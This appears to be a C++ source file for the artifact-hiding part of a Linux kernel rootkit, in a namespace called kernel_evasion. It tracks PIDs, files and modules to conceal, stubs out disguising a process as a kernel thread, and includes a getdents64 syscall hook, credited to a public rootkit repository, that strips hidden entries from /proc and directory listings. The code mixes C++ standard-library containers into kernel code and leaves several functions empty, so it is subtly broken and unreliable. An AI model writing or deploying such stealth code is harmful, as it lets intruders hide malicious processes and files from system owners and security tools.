#include "artifact_hiding.h"
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/module.h>
#include <algorithm>

namespace kernel_evasion {

// Hidden process/file lists (simplified; use RCU/locking in production).
static std::vector<pid_t> hidden_processes_;
static std::vector<std::string> hidden_files_;
static std::vector<std::string> hidden_modules_;

ArtifactHiding::ArtifactHiding() {}
ArtifactHiding::~ArtifactHiding() {}

ErrorCode ArtifactHiding::hide_process(pid_t pid) {
    hidden_processes_.push_back(pid);
    return ErrorCode::SUCCESS;
}

ErrorCode ArtifactHiding::unhide_process(pid_t pid) {
    auto it = std::find(hidden_processes_.begin(), hidden_processes_.end(), pid);
    if (it != hidden_processes_.end()) {
        hidden_processes_.erase(it);
        return ErrorCode::SUCCESS;
    }
    return ErrorCode::HOOK_NOT_FOUND;
}

ErrorCode ArtifactHiding::hide_file(const std::string& file_path) {
    hidden_files_.push_back(file_path);
    return ErrorCode::SUCCESS;
}

ErrorCode ArtifactHiding::unhide_file(const std::string& file_path) {
    auto it = std::find(hidden_files_.begin(), hidden_files_.end(), file_path);
    if (it != hidden_files_.end()) {
        hidden_files_.erase(it);
        return ErrorCode::SUCCESS;
    }
    return ErrorCode::HOOK_NOT_FOUND;
}

ErrorCode ArtifactHiding::disguise_as_kernel_thread(pid_t pid,
                                                     const std::string& fake_name) {
    return rewrite_process_metadata(pid, fake_name, fake_name);
}

ErrorCode ArtifactHiding::hide_module(const std::string& module_name) {
    hidden_modules_.push_back(module_name);
    return ErrorCode::SUCCESS;
}

ErrorCode ArtifactHiding::rewrite_process_metadata(pid_t pid,
                                                    const std::string& fake_name,
                                                    const std::string& fake_cmdline) {
    // TODO: Hook /proc/[pid]/stat, cmdline, comm reads.
    // Use the same ftrace hook pattern on read/readlink syscalls.
    return ErrorCode::SUCCESS;
}

ArtifactHiding::HiddenArtifacts ArtifactHiding::list_hidden_artifacts() {
    return {hidden_processes_, hidden_files_, hidden_modules_};
}

// Actual kernel-side getdents64 hook.
// Adapted from xcellerator/linux_kernel_hacking (rootkit.c).
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent =
        (struct linux_dirent64 __user *)regs->si;
    long ret = orig_getdents64(regs);
    if (ret <= 0) return ret;

    struct linux_dirent64 *dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (!dirent_ker) return ret;

    if (copy_from_user(dirent_ker, dirent, ret)) {
        kfree(dirent_ker);
        return ret;
    }

    struct linux_dirent64 *current_dir, *previous_dir = NULL;
    unsigned long offset = 0;

    while (offset < ret) {
        current_dir = (void *)dirent_ker + offset;

        // Check against hidden PIDs (numeric directory names in /proc).
        bool should_hide = false;
        for (pid_t pid : hidden_processes_) {
            char pid_str[16];
            snprintf(pid_str, sizeof(pid_str), "%d", pid);
            if (strcmp(current_dir->d_name, pid_str) == 0) {
                should_hide = true;
                break;
            }
        }
        // Check against hidden files.
        if (!should_hide) {
            for (const auto& file : hidden_files_) {
                if (strcmp(current_dir->d_name, file.c_str()) == 0) {
                    should_hide = true;
                    break;
                }
            }
        }

        if (should_hide) {
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir,
                        (void *)current_dir + current_dir->d_reclen,
                        ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }

    if (copy_to_user(dirent, dirent_ker, ret)) {
        kfree(dirent_ker);
        return -EFAULT;
    }
    kfree(dirent_ker);
    return ret;
}

long ArtifactHiding::handle_getdents64(unsigned int fd,
                                       struct linux_dirent64* dirp,
                                       unsigned int count) {
    return 0;
}

}  // namespace kernel_evasion